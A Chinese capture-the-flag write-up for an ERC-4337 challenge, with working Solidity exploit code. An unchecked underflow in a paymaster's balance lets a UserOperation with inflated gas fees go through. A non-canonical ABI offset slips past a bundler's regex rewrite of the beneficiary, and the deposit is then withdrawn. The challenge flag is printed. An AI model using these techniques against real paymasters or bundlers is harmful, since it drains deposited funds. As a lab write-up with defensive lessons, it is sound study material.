# SURVIVE

## 题目简述

题目围绕 ERC-4337 Account Abstraction。`Setup` 为 `SimplePaymaster` 在 `EntryPoint` 中存入 $20$ ETH，并为玩家的 counterfactual account 预存少量 ERC-20。通关条件是玩家原生 ETH 余额超过 $19$ ETH。

服务端提供代发 `EntryPoint.handleOps` 的 bundler 接口，但会尝试把 calldata 中的 beneficiary 替换为固定地址。Paymaster 的内部余额扣减则被放在 `unchecked` 中：

```solidity
unchecked {
    uint256 tokenAmount = weiToToken(preChargeNative, cachedPriceWithMarkup);
    balances[userOp.sender] -= tokenAmount;
}
```

因此即使用户操作需要的代币费用超过账户余额，减法也只会下溢回绕，不会回滚。

## 解题过程

### 构造可被 Paymaster 接受的 UserOperation

官方求解器创建玩家的 `SimpleAccount`，并构造一个空 `callData` 的 `PackedUserOperation`。重点是把 gas fee 和预验证 gas 设得很高，使 `EntryPoint` 执行后需要向 beneficiary 支付一笔足够大的补偿：

```solidity
ops[0] = PackedUserOperation({
    sender: account,
    nonce: 0,
    initCode: initCode,
    callData: new bytes(0),
    accountGasLimits: bytes32(abi.encodePacked(
        uint128(300000), uint128(10000)
    )),
    preVerificationGas: 650000,
    gasFees: bytes32(abi.encodePacked(
        uint128(1e12), uint128(1e12)
    )),
    paymasterAndData: abi.encodePacked(
        paymaster, uint128(100000), uint128(150000)
    ),
    signature: new bytes(0)
});
```

对 `entryPoint.getUserOpHash(ops[0])` 加上 Ethereum Signed Message 前缀后，用玩家私钥签名即可通过账户校验。Paymaster 侧虽然计算出高额 token 预扣款，但 `unchecked` 下溢让操作继续执行。

### 用非规范 ABI 布局绕过 beneficiary 替换

服务端只接受 `handleOps` selector，随后用正则定位常规 ABI 编码中的 beneficiary 并替换为 `0x...cafE`。求解器把动态数组参数的偏移从标准的 `0x40` 改成 `0x60`，并在动态数据前保留 `abi.encode(ops)` 自带的 `0x20` 偏移字：

```solidity
bytes memory data = abi.encode(ops);
data = abi.encodePacked(
    IEntryPoint.handleOps.selector,
    uint256(0x60),
    abi.encode(user),
    data
);
```

这份 calldata 对 ABI 解码器仍然有效，但 beneficiary 不再处于服务端正则假定的位置，因此玩家地址不会被覆盖。`EntryPoint` 最终从 Paymaster 的 deposit 中向玩家支付 bundle 补偿，玩家由此获得发送普通交易所需的 ETH。

玩家同时也是 Paymaster owner。拿到第一笔 ETH 后，再直接发送交易提走 Paymaster 在 `EntryPoint` 中的剩余 deposit：

```solidity
paymaster.withdrawTo(payable(user), paymaster.getDeposit());
require(setup.isSolved());
```

两步所得余额合计超过 $19$ ETH，满足通关条件。

仓库中比赛环境的 `FLAG` 配置为：

```text
SEKAI{(*V*)/E_1t5_n4t1v3_70k3n5!!!}
```

## 方法总结

- 核心技巧：利用 `unchecked` 余额下溢让 Paymaster 赞助超额 gas，再用非规范但合法的 ABI 动态偏移绕过服务端对 beneficiary 的文本替换。
- 识别信号：安全控制在 ABI 编码后的十六进制字符串上做正则替换，而链上解码器接受多种等价布局；费用记账又位于 `unchecked`。
- 复用要点：过滤器必须先按 ABI 解码并校验语义，不能依赖固定字节位置；ERC-4337 Paymaster 的内部额度、预扣费、`postOp` 和 EntryPoint deposit 必须分别检查算术边界与资金流。
